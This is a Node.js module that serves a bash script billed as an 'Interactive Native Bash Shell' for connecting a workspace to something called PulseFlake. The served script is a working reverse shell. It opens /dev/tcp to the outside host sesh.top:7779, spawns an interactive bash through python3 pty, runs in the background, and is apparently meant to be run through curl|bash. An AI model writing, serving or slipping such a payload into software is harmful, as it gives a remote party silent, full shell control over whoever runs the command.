const http = require('http');

function serveBashScript(port = 7777) {
    const server = http.createServer((req, res) => {
        const url = req.url || '/';
        const match = url.match(/^\/?([\w.-]+)?$/);
        let defaultWorkspace = '';
        if (match && match[1]) {
            defaultWorkspace = match[1];
        }
        
        if (req.method === 'GET' && (url === '/' || defaultWorkspace)) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            let script = '#!/bin/bash\n';
            script += '# Interactive Native Bash Shell for PulseFlake\n';
            
            if (defaultWorkspace) {
                script += 'WORKSPACE="' + defaultWorkspace + '"\n';
            } else {
                script += 'if [ -z "$1" ]; then read -p "Workspace Name: " WORKSPACE; else WORKSPACE="$1"; fi\n';
            }
            
            script += 'if [ -z "$WORKSPACE" ]; then echo "Error: Workspace name required"; exit 1; fi\n';
            script += 'echo "Connecting workspace \'$WORKSPACE\' to PulseFlake..."\n\n';
            
            // Re-exec bash with job control enabled (-i) and ensure standard streams are handled properly
            script += '(\n';
            script += '    exec 3<>/dev/tcp/sesh.top/7779\n';
            script += '    echo "$WORKSPACE" >&3\n';
            script += '    # We use stty to set a basic terminal state if it was launched via curl|bash\n';
            script += '    python3 -c "import pty; pty.spawn([\'/bin/bash\', \'-i\'])" <&3 >&3 2>&3\n';
            script += ') &\n';
            script += 'echo "Connection backgrounded. PID: $!"\n';
            
            res.end(script);
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(port, () => {
        console.log(`[Device] Bash Script Server listening on port ${port}`);
    });
}

module.exports = serveBashScript;
